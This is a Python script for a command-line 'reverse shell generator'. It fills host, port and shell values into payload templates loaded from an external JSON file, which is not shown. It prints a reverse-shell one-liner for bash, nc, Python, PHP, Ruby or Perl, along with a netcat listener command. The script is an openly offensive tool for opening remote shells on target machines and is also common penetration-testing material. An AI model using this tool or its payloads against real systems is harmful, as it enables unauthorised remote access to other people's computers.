#!/usr/bin/python3

# I don't believe in license.
# You can do whatever you want with this tool.

import argparse
import os
import json
import colorama
from colorama import Fore, Style

def banner():
    version = 1.0
    print(Fore.GREEN + """
                                                __         ____                                     __            
   ________ _   _____  _____________      _____/ /_  ___  / / /   ____ ____  ____  ___  _________ _/ /_____  _____
  / ___/ _ \ | / / _ \/ ___/ ___/ _ \    / ___/ __ \/ _ \/ / /   / __ `/ _ \/ __ \/ _ \/ ___/ __ `/ __/ __ \/ ___/
 / /  /  __/ |/ /  __/ /  (__  )  __/   (__  ) / / /  __/ / /   / /_/ /  __/ / / /  __/ /  / /_/ / /_/ /_/ / /    
/_/   \___/|___/\___/_/  /____/\___/   /____/_/ /_/\___/_/_/    \__, /\___/_/ /_/\___/_/   \__,_/\__/\____/_/     
                                                               /____/                                             

            + -- --=[ v""" + str(version) + """ by @0xkaneki

    """ + Style.RESET_ALL)


def generate_reverse_shell(host, port, type="bash", shell="sh"):
    path = os.path.dirname(os.path.abspath(__file__))
    with open(path + "/payloads.json") as json_file:
        payloads = json.load(json_file)
        
    payload = payloads[type].replace("$HOST", host).replace("$PORT", port).replace("$SHELL", shell)

    return payload

banner()

parser = argparse.ArgumentParser(usage="python3 reverse_shell_generator.py [-i/--host] HOST [-p/--port] PORT [OPTIONS]")
optional = parser._action_groups.pop()
required = parser.add_argument_group("required arguments")

required.add_argument("-i","--host",help="host listening the connection")
required.add_argument("-p","--port",help="port listening the connection")
optional.add_argument("-t","--type",help="language or tool - Options: bash, sh, nc, python, python3, php, ruby, perl")
optional.add_argument("-s","--shell",help="shell - Options: sh, bash")
optional.add_argument("-e","--encode",help="output encode - Options: base64, urlencode, hex")

parser._action_groups.append(optional)
args = parser.parse_args()

_host = args.host
_port = args.port
_type = args.type
_shell = args.shell
_encode = args.encode

if (not _host) or (not _port):
    print(Fore.LIGHTRED_EX + "Incorrect usage")
    print("Usage: python3 reverse_shell_generator.py [-i/--host] HOST [-p/--port] PORT [OPTIONS]" + Style.RESET_ALL)
else:
    if not _type:
        _type = "bash"

    if not _shell:
        _shell = "bash"

    if (
        (_type != "bash") and
        (_type != "sh") and
        (_type != "nc") and
        (_type != "python") and
        (_type != "python3") and
        (_type != "php") and
        (_type != "ruby") and
        (_type != "perl")
    ):
        print(Fore.LIGHTRED_EX + "-t/--type only accept bash, sh, nc, python, python3, php, ruby, perl values" + Style.RESET_ALL)
        exit()

    if (_shell != "sh") and (_shell != "bash"):
        print(Fore.LIGHTRED_EX + "-s/--shell only accept sh, bash values" + Style.RESET_ALL)
        exit()

    print(Fore.GREEN + "To listen the connection, run: nc -lnvp " + _port + " on host " + _host + Style.RESET_ALL)
    print(Fore.GREEN + "Payload: " + Style.RESET_ALL + generate_reverse_shell(_host, _port, _type, _shell))